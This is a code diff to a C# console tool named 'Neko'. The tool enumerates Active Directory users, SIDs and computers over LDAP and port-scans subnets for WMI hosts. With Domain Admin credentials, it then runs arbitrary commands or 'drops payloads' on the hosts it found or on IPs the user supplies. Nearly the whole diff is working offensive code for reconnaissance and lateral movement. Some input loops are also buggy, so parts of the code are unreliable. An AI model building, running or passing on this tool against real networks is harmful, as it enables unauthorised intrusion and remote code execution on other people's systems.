@@ -14,6 +14,7 @@ using System.Text.RegularExpressions;
 using System.Net.NetworkInformation;
 using System.DirectoryServices;
 using System.Security.Principal;
+using System.DirectoryServices.ActiveDirectory;
 
 namespace Recon
 {
@@ -24,222 +25,301 @@ namespace Recon
 
             Console.WriteLine("Welcome to Neko. \r\n");
 
-
+            //Prompt user decision on recon or deployment via WMI
+            Console.WriteLine("Options: \r\n\r\n 1: Recon \r\n\r\n 2: Deployment via WMI");
+            string attackType = Console.ReadLine();
+            while(attackType != "1" && attackType != "2")
+            {
+                Console.WriteLine("Invalid selection. Enter '1' for Recon or '2' Deployment via WMI");
+                attackType = Console.ReadLine();
+            }
 
             //Create document for scan results
             string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
 
-            Console.WriteLine("Conduct local system recon? Enter 'y' or 'n' or 'exit':");
-            string machineInfo = Console.ReadLine();
-
-            //Create text file for results
-            using (StreamWriter outputFile = new StreamWriter(Path.Combine(docPath, "results.txt")))
-            {
-                outputFile.WriteLine("Results of Recon:" + "\r\n\r\n");
-            }
-
-            //Determine if user wants to do a local recon scan
-            while (machineInfo != "y" && machineInfo != "n")
-            {
-                Console.WriteLine("Invalid selection. Would you like to conduct local system recon? Enter 'y' or 'n' or 'exit': ");
-                machineInfo = Console.ReadLine();
-            }
-
-            //Run local recon if user selects yes
-            if (machineInfo == "y")
-            {
-                LocalMachine(docPath);
-            }
-            else if (machineInfo == "exit")
-            {
-                Environment.Exit(0);
-            }
-
-            //Domain info
+            //Get domain name
             string domainURL = "";
-
-            //See if user wants to do LDAP searching
-            Console.WriteLine("Do you want to do network recon via LDAP? Enter 'y' or 'n':");
-            string ldapQueries = Console.ReadLine();
-            while (ldapQueries != "y" && ldapQueries != "n")
+            try
             {
-                Console.WriteLine("Invalid selection. Do you want to do network recon via LDAP? Enter 'y' or 'n':");
-                ldapQueries = Console.ReadLine();
+                Domain domain = Domain.GetComputerDomain();
+                domainURL = domain.Name;
             }
-
-            //If user opts to run ldap queries 
-            if (ldapQueries == "y")
+            catch
             {
-                //Get info for domain
-                Console.WriteLine("Please enter the domain for searchin:");
-                domainURL = Console.ReadLine();
 
-                //Confirm that it is correct
-                Console.WriteLine("Recon will begin on: " + domainURL + " Is this correct? Enter 'y' or 'n':");
-                string ldapConfirmation = Console.ReadLine();
-                while (ldapConfirmation != "y" && ldapConfirmation != "n")
-                {
-                    Console.WriteLine("Invalid selection. Recon will begin on: " + domainURL + " Is this correct? Enter 'y' or 'n':");
-                }
-                //If confirmed conduct LDAP recon on target domain
-                if(ldapConfirmation == "y")
-                {
-                    //Active Directory Recon
-                    var usersList = ADUser.GetUsers("LDAP://" + domainURL);
-                    Console.WriteLine("Found users: ");
-                    foreach (var userAccount in usersList)
-                    {
-                        //Console.WriteLine(usersList.Count());
-                        //Console.WriteLine(userAccount.CN);
-                        Console.WriteLine(userAccount.SamAccountName);
-                        Console.WriteLine(userAccount.SID);
-                        File.AppendAllText(docPath + "\\results.txt", userAccount.SamAccountName + userAccount.SID + Environment.NewLine);
-                    }
-
-                    var computerList = ADComputer.GetADComputers(domainURL);
-                    Console.WriteLine("Found computers:");
-                    foreach(var computer in computerList)
-                    {
-                        Console.WriteLine(computer.ComputerInfo);
-                        File.AppendAllText(docPath + "\\results.txt", computer.ComputerInfo + Environment.NewLine);
-                    }
-                }
-                
             }
 
 
-
-            //See if user wants to do a network scan
-            var networkScan = NetworkChoice();
-            //If they select yes, get type
-            if (networkScan == "n")
+            if (attackType == "1")
             {
-                Environment.Exit(0);
-            }
-
-            //Continue with scan if not exited
-            //Get type of scan
-            var scanType = UserSelection();
-
-
-            //WMI user information
-            string wmiUsername = "";
-            string wmiPassword = "";
-
-
-            // Get WMI User Info
-            if (scanType == "1")
-            {
-                Console.WriteLine("This process requires Domain Admin credentials, proceed? Enter 'y' or 'n':");
-                string hasDomain = Console.ReadLine();
-                while (hasDomain != "y" && hasDomain != "n")
+                Console.WriteLine("Recon options: 1: Local machine \r\n\r\n 2: Domain \r\n\r\n 3:Network");
+                string reconChoice = Console.ReadLine();
+                while(reconChoice != "1" && reconChoice !="2" && reconChoice != "3")
                 {
-                    Console.WriteLine("Invalid selection. This process requires Domain Admin credentials, proceed? Enter 'y' or 'n':");
-                    hasDomain = Console.ReadLine();
+                    Console.WriteLine("Invalid selection. Enter '1' for Local machine, '2' for Domain, or '3' for Network");
+                    reconChoice = Console.ReadLine();
                 }
-                if (hasDomain == "y")
+
+
+                //Create text file for results
+                using (StreamWriter outputFile = new StreamWriter(Path.Combine(docPath, "results.txt")))
                 {
-                    Console.WriteLine("Enter user name:");
-                    wmiUsername = Console.ReadLine();
-                    //Password
-                    Console.WriteLine("Enter password:");
-                    wmiPassword = Console.ReadLine();
-                    //Get computer domain
+                    outputFile.WriteLine("Results of Recon:" + "\r\n\r\n");
+                }
 
-
-                    //If LDAP querying was not done, gets domain to use for WMI
-                    if(domainURL == "")
+                if(reconChoice == "1")
+                {
+                    Console.WriteLine("Conduct local system recon? Enter 'y' or 'n' or 'exit':");
+                    string machineInfo = Console.ReadLine();
+                    while (machineInfo != "y" && machineInfo != "n")
                     {
-                        Console.WriteLine("Enter network domain:");
-                        domainURL = Console.ReadLine();
+                        Console.WriteLine("Invalid selection. Do you want to do network recon via LDAP? Enter 'y' or 'n':");
+                        machineInfo = Console.ReadLine();
                     }
-                    //If ldap querying was done, confirms they want to use the same domain
-                    else if (domainURL != "")
+                    //Conduct local recon
+                    LocalMachine(docPath);
+                }
+                else if(reconChoice == "2")
+                {
+                    //Domain info
+                    //string domainURL = "";
+
+                    //See if user wants to do LDAP searching
+                    Console.WriteLine("Do you want to do network recon via LDAP? Enter 'y' or 'n':");
+                    string ldapQueries = Console.ReadLine();
+                    while (ldapQueries != "y" && ldapQueries != "n")
+                    {
+                        Console.WriteLine("Invalid selection. Do you want to do network recon via LDAP? Enter 'y' or 'n':");
+                        ldapQueries = Console.ReadLine();
+                    }
+
+                    //If user opts to run ldap queries 
+                    if (ldapQueries == "y")
                     {
 
-                        Console.WriteLine("The domain selected for LDAP recon was: " + domainURL + " Would you like to continue using this domain? Enter 'y' or 'n':");
-                        string domainConfirmation = Console.ReadLine();
-                        while (domainConfirmation != "y" && domainConfirmation != "n")
+                        //Confirm that it is correct
+                        Console.WriteLine("Recon will begin on: " + domainURL + "." + " Is this correct? Enter 'y' or 'n':");
+                        string ldapConfirmation = Console.ReadLine();
+                        while (ldapConfirmation != "y" && ldapConfirmation != "n")
                         {
-                            Console.WriteLine("Invalid selection. The domain selected for LDAP recon was: " + domainURL + " Would you like to continue using this domain? Enter 'y' or 'n':");
-                            domainConfirmation = Console.ReadLine();
+                            Console.WriteLine("Invalid selection. Recon will begin on: " + domainURL + " Is this correct? Enter 'y' or 'n':");
                         }
-                        //If they select n, they're prompted for a different domain
-                        if(domainConfirmation == "n")
+                        //If user wants to use a different domain, get that one.
+                        if (ldapConfirmation == "n")
                         {
-                            Console.WriteLine("Please enter new domain to use:");
+                            //Get info for domain
+                            Console.WriteLine("Please enter the domain for searchin:");
                             domainURL = Console.ReadLine();
                         }
+
+                        //Active Directory Recon
+                        var usersList = ADUser.GetUsers("LDAP://" + domainURL);
+                        Console.WriteLine("Found users: ");
+                        foreach (var userAccount in usersList)
+                        {
+                            //Console.WriteLine(usersList.Count());
+                            //Console.WriteLine(userAccount.CN);
+                            Console.WriteLine(userAccount.SamAccountName);
+                            Console.WriteLine(userAccount.SID);
+                            File.AppendAllText(docPath + "\\results.txt", userAccount.SamAccountName + userAccount.SID + Environment.NewLine);
+                        }
+
+                        var computerList = ADComputer.GetADComputers(domainURL);
+                        Console.WriteLine("Found computers:");
+                        foreach (var computer in computerList)
+                        {
+                            Console.WriteLine(computer.ComputerInfo);
+                            File.AppendAllText(docPath + "\\results.txt", computer.ComputerInfo + Environment.NewLine);
+                        }
+                        
                     }
-                    
                 }
-
-            }
-
-
-            //Get Default gateway
-            string localIp = Convert.ToString(GetDefaultGateway());
-
-            //Get choice whether user wants to use default gateway or different subnet, then valid
-            var ipChoice = UserIpChoice(localIp);
-
-            //Get port type selection
-            var portChoice = PortSelection();
-
-            //Get stripped IP from ip Choice
-            var strippedIp = StripIP(ipChoice);
-
-
-            //Create list for WMI hosts
-            List<string> wmiList = new List<string>();
-
-
-            //Initiate scanning functions
-            if (portChoice == "1" || portChoice == "2")
-            {
-                bool scanning = (MultithreadScan(strippedIp, portChoice, scanType, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
+                else if (reconChoice == "3")
                 {
-                    while (scanning == true)
+                    //Get type of scan
+                    var scanType = UserSelection();
+
+                    //WMI user information
+                    string wmiUsername = "";
+                    string wmiPassword = "";
+
+
+                    // Get WMI User Info
+                    if (scanType == "1")
+                    {
+                        Console.WriteLine("This process requires Domain Admin credentials, proceed? Enter 'y' or 'n':");
+                        string hasDomain = Console.ReadLine();
+                        while (hasDomain != "y" && hasDomain != "n")
+                        {
+                            Console.WriteLine("Invalid selection. This process requires Domain Admin credentials, proceed? Enter 'y' or 'n':");
+                            hasDomain = Console.ReadLine();
+                        }
+                        if (hasDomain == "y")
+                        {
+                            Console.WriteLine("Enter user name:");
+                            wmiUsername = Console.ReadLine();
+                            //Password
+                            Console.WriteLine("Enter password:");
+                            wmiPassword = Console.ReadLine();
+                            //Get computer domain
+
+
+                            //If LDAP querying was not done, gets domain to use for WMI
+                            if (domainURL == "")
+                            {
+                                Console.WriteLine("Enter network domain:");
+                                domainURL = Console.ReadLine();
+                            }
+                            //If ldap querying was done, confirms they want to use the same domain
+                            else if (domainURL != "")
+                            {
+
+                                Console.WriteLine("The domain selected for LDAP recon was: " + domainURL + " Would you like to continue using this domain? Enter 'y' or 'n':");
+                                string domainConfirmation = Console.ReadLine();
+                                while (domainConfirmation != "y" && domainConfirmation != "n")
+                                {
+                                    Console.WriteLine("Invalid selection. The domain selected for LDAP recon was: " + domainURL + " Would you like to continue using this domain? Enter 'y' or 'n':");
+                                    domainConfirmation = Console.ReadLine();
+                                }
+                                //If they select n, they're prompted for a different domain
+                                if (domainConfirmation == "n")
+                                {
+                                    Console.WriteLine("Please enter new domain to use:");
+                                    domainURL = Console.ReadLine();
+                                }
+                            }
+
+                        }
+
+                    }
+
+
+                    //Get Default gateway
+                    string localIp = Convert.ToString(GetDefaultGateway());
+
+                    //Get choice whether user wants to use default gateway or different subnet, then valid
+                    var ipChoice = UserIpChoice(localIp);
+
+                    //Get port type selection
+                    var portChoice = PortSelection();
+
+                    //Get stripped IP from ip Choice
+                    var strippedIp = StripIP(ipChoice);
+
+
+                    //Create list for WMI hosts
+                    List<string> wmiList = new List<string>();
+
+
+                    //Initiate scanning functions
+                    if (portChoice == "1" || portChoice == "2")
+                    {
+                        bool scanning = (MultithreadScan(strippedIp, portChoice, scanType, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
+                        {
+                            while (scanning == true)
+                            {
+
+                            }
+                        }
+                    }
+                    //Selected port scan
+                    else if (portChoice == "3")
+                    {
+                        while (SelectedPortScan(strippedIp, scanType, wmiUsername, wmiPassword, domainURL, docPath, wmiList) == true)
+                        {
+
+                        }
+                    }
+
+                    Console.WriteLine("Scanning finished");
+
+                    //See if user wants to drop payloads via WMI
+                    Console.WriteLine("Drop payload to found WMI targets? Enter 'y' or 'n' or 'exit':");
+                    string targetWmi = Console.ReadLine();
+
+                    while (targetWmi != "y" && targetWmi != "n" && targetWmi != "exit")
+                    {
+                        Console.WriteLine("Invalid command. Drop payload to found WMI targets? Enter 'y' or 'n' or 'exit':");
+                        targetWmi = Console.ReadLine();
+                    }
+                    if (targetWmi == "y")
                     {
 
+                        string commandFile = "";
+                        Console.WriteLine("Enter remote command, for example, Notepad.exe, Dir, Shutdown -r:");
+                        //Get command from user
+                        commandFile = Console.ReadLine();
+                        //Need to add - options for deploying payload from local machine and installing it on the targets' admin$ or c$
+
+                        // Attack targets
+                        foreach (string target in wmiList)
+                        {
+                            AttackWMI(wmiUsername, wmiPassword, domainURL, target, commandFile);
+                        }
                     }
                 }
             }
-            //Selected port scan
-            else if (portChoice == "3")
+            else if (attackType == "2")
             {
-                while (SelectedPortScan(strippedIp, scanType, wmiUsername, wmiPassword, domainURL, docPath, wmiList) == true)
+                Console.WriteLine("Drop payload or create processes on selected WMI targets? Enter 'y' or 'n' or 'exit':");
+                string targetWmi = Console.ReadLine();
+
+                while (targetWmi != "y" && targetWmi != "n" && targetWmi != "exit")
+                {
+                    Console.WriteLine("Invalid command. Drop payload or create processes on selected WMI targets? Enter 'y' or 'n' or 'exit':");
+                    targetWmi = Console.ReadLine();
+                }
+                if (targetWmi == "y")
                 {
 
+                    Console.WriteLine("This process requires Domain Admin credentials, proceed? Enter 'y' or 'n':");
+                    string hasDomain = Console.ReadLine();
+                    while (hasDomain != "y" && hasDomain != "n")
+                    {
+                        Console.WriteLine("Invalid selection. This process requires Domain Admin credentials, proceed? Enter 'y' or 'n':");
+                        hasDomain = Console.ReadLine();
+                    }
+                    if (hasDomain == "y")
+                    {
+                        Console.WriteLine("Enter user name:");
+                        string wmiUsername = Console.ReadLine();
+                        //Password
+                        Console.WriteLine("Enter password:");
+                        string wmiPassword = Console.ReadLine();
+                        //Get computer domain
+
+                        Console.WriteLine("Enter IP addresses separated by commas:");
+                        //Get IP targets
+                        string ipTargets = Console.ReadLine();
+                        //Split into array by commas
+                        string[] ipSplit = ipTargets.Split(',');
+
+                        //Declare command
+                        string commandFile = "";
+                        Console.WriteLine("Enter remote command, for example, Notepad.exe, Dir, Shutdown -r:");
+                        //Get command from user
+                        commandFile = Console.ReadLine();
+                        //Need to add - options for deploying payload from local machine and installing it on the targets' admin$ or c$
+
+                        // Attack targets
+                        foreach (string target in ipSplit)
+                        {
+                            AttackWMI(wmiUsername, wmiPassword, domainURL, target, commandFile);
+                        }
+                    }
                 }
             }
 
-            Console.WriteLine("Scanning finished");
 
-            //See if user wants to drop payloads via WMI
-            Console.WriteLine("Drop payload to found WMI targets? Enter 'y' or 'n' or 'exit':");
-            string targetWmi = Console.ReadLine();
+            ////See if user wants to do a network scan
+            //var networkScan = NetworkChoice();
+            ////If they select yes, get type
+            //if (networkScan == "n")
+            //{
+            //    Environment.Exit(0);
+            //}
 
-            while (targetWmi != "y" && targetWmi != "n" && targetWmi != "exit")
-            {
-                Console.WriteLine("Invalid command. Drop payload to found WMI targets? Enter 'y' or 'n' or 'exit':");
-                targetWmi = Console.ReadLine();
-            }
-            if (targetWmi == "y")
-            {
-
-                string commandFile = "";
-                Console.WriteLine("Enter remote command, for example, Notepad.exe, Dir, Shutdown -r:");
-                //Get command from user
-                commandFile = Console.ReadLine();
-                //Need to add - options for deploying payload from local machine and installing it on the targets' admin$ or c$
-
-                // Attack targets
-                foreach (string target in wmiList)
-                {
-                    AttackWMI(wmiUsername, wmiPassword, domainURL, target, commandFile);
-                }
-            }
+            //Continue with scan if not exited
 
         }
 
@@ -1105,7 +1185,9 @@ namespace Recon
                     var computer = new ADComputer();
 
                     string ComputerName = results.GetDirectoryEntry().Name;
-                    if (ComputerName.StartsWith("CN=")) ComputerName = ComputerName.Remove(0, "CN=".Length); computer.ComputerInfo = ComputerName.ToString(); ;
+                    //Remove CN from results
+                    if (ComputerName.StartsWith("CN=")) ComputerName = ComputerName.Remove(0, "CN=".Length); computer.ComputerInfo = ComputerName.ToString(); 
+                    //Add to list
                     computers.Add(computer);
 
                 }
